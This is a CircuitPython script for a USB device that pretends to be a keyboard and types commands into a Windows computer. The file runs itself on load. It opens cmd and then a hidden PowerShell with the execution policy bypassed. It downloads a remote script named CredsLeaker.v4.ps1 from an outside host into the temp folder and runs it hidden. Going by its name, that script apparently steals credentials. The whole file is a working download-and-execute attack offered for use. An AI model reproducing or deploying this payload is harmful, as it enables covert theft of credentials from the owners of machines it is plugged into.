import time
import board
import digitalio
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard()
layout = KeyboardLayoutUS(kbd)

def run_payload():
    kbd.send(Keycode.GUI, Keycode.R)   
    time.sleep(0.80)
    layout.write('cmd') 
    time.sleep(0.80)
    kbd.send(Keycode.ENTER) 
    time.sleep(0.80)
    layout.write("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass")
    time.sleep(0.80)
    kbd.send(Keycode.ENTER)
    time.sleep(0.80)
    layout.write("Invoke-RestMethod -uri ""https://apsec.dev/scripts/credtrojan/CredsLeaker.v4.ps1"" -OutFile ""$env:temp\cl.ps1""")
    time.sleep(0.80)
    kbd.send(Keycode.ENTER)
    time.sleep(0.80)
    layout.write("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass -file ""$env:temp\cl.ps1"" -mode ""dynamic""")
    time.sleep(0.80)
    kbd.send(Keycode.ENTER)
        
run_payload()